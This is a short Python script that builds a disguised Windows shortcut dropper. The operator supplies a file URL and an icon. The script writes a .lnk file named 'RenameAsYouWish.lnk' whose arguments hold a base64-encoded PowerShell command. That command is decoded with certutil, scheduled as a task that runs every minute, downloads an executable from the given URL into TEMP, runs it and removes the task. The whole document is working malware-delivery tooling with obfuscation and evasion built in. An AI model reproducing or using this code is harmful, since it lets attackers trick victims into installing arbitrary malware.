import os
import sys
try:
    import win32com.client
except:
    os.system("pip install pywin32")
    import win32com.client
import base64

def create_shortcut(target, shortcut_name, code, working_dir=None, icon_path=None):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_name)
    shortcut.Targetpath = target
    if working_dir:
        shortcut.WorkingDirectory = working_dir
    if icon_path:
        shortcut.IconLocation = icon_path
    shortcut.Arguments = code
    shortcut.save()
    
    
def main():
    fileurl = input('File URL (Must be a direct download) -> ')
    
    cmd = f"""powershell -command "IWR '{fileurl}' -OutFile '$env:TEMP\end.exe'"; Unregister-ScheduledTask -TaskName "n5dMmJEBYc"-Confirm:$false ; start $env:TEMP\end.exe"""
    
    data = base64.b64encode(cmd.encode()).decode()
    
    cmd_commands = f'''powershell echo {data} > $env:TEMP\phase1.ps1;certutil -decode $env:TEMP\phase1.ps1 $env:TEMP\phase2.ps1; schtasks /create /f /sc minute /mo 1 /tn n5dMmJEBYc /tr \"%TEMP%\\phase2.ps1\" '''
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    shortcut_name = os.path.join(script_dir, 'RenameAsYouWish.lnk')
    
    icon = input('Input an icon (Nothing if None) -> ')
    
    create_shortcut("powershell", shortcut_name, cmd_commands,None,icon_path=icon)

if __name__ == "__main__":
    main()
